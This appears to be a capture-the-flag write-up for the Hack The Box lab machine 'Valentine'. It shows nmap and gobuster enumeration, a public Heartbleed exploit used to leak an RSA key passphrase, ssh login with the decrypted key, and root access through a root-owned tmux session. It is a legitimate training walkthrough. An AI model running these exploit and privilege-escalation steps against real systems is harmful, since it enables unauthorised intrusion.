![logo](/logo.png)

# [Valentine- BOX]  
Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 17 Feb 2018 machine on HTB,Valentine created by [mrb3n](https://app.hackthebox.com/users/2984).So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *tmux
  *encryption
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/valentine 10.10.10.79
```

![](/Linux/Linux-Easy/Valentine/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/valentine 10.10.10.79                                                                                       ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-16 18:26 EAT
Nmap scan report for 10.10.10.79
Host is up (0.32s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: 2024-09-16T15:26:49+00:00; +6s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 5s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.79 seconds
```

looking at the results  we find out that there are 3 ports open and its a `Ubuntu`and its running an `Apache server`. 

port[22]-ssh
port[80]- http
port[443]-ssl

so when we go the browser at [http://10.10.10.79](http://10.10.10.79) i find a web browser that has some graphite also when i check https i find the same image.

![](/Linux/Linux-Easy/Valentine/Screenshots/love.png)

let me start gobuster to enumerate active directories since their is no interesting thing i find

```sh
 gobuster dir -u https://10.10.10.79 -w /usr/share/wordlists/dirb/common.txt -k --no-error
```

![](/Linux/Linux-Easy/Valentine/Screenshots/gobuster.png)

i find some folders so let me check what i can get from them.I find this in the `dev` folder 

![](/Linux/Linux-Easy/Valentine/Screenshots/dev.png)

so when i navigate to decode i get

![](/Linux/Linux-Easy/Valentine/Screenshots/decode.png)

in the hype_key we find string which hints that sensitive data may be going in and out of the decoder. That’s an indication that the string we found earlier might be important. 

```sh
cat hype_key | xxd -r -p
```

Grab it, and it decodes to an encrypted RSA cert:

![](/Linux/Linux-Easy/Valentine/Screenshots/rsa.png)

since it was a heartbleed logo lets search for heartbleed explort.Heartbleed is a logic error that allowed an attacker to grab chunks of random memory that they shouldn’t have had access to.

There’s no better explanation of Heartbleed than [xkcd’s](https://xkcd.com/1354/):

```sh
searchsploit heartbleed
```


![](/Linux/Linux-Easy/Valentine/Screenshots/heartbleed.png)

```sh
python 32764.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
```

![](/Linux/Linux-Easy/Valentine/Screenshots/python2.png)

```sh
echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
```

![](/Linux/Linux-Easy/Valentine/Screenshots/name.png)

```sh
cat hype_key | xxd -r -p > hype_key_encrypted
```

![](/Linux/Linux-Easy/Valentine/Screenshots/encryt.png)

We can use openssl to try to decrypt. It asks for a password… the decode of the base64 collected with heartbleed, `heartbleedbelievethehype` works:

```sh
openssl rsa -in hype_key_encrypted -out hype_key_decrypted
```

![](/Linux/Linux-Easy/Valentine/Screenshots/encryption.png)

With the decrypted key, ssh in as `hype`, given the file name:

```sh
ssh -i hype_key_decrypted hype@10.10.10.79
```

![](/Linux/Linux-Easy/Valentine/Screenshots/hypessh.png)

we can find the `user flag`

![](/Linux/Linux-Easy/Valentine/Screenshots/userflag.png)

Running ps aux reveals a tmux session being run as the root user.

```sh
ps -ef | grep tmux
```

![](/Linux/Linux-Easy/Valentine/Screenshots/ps.png)

Simply running the command tmux -S /.devs/dev_sess will connect to the session, with full root
privileges

![](/Linux/Linux-Easy/Valentine/Screenshots/tmux.png)


and from their we can get a root flag from 

![](/Linux/Linux-Easy/Valentine/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------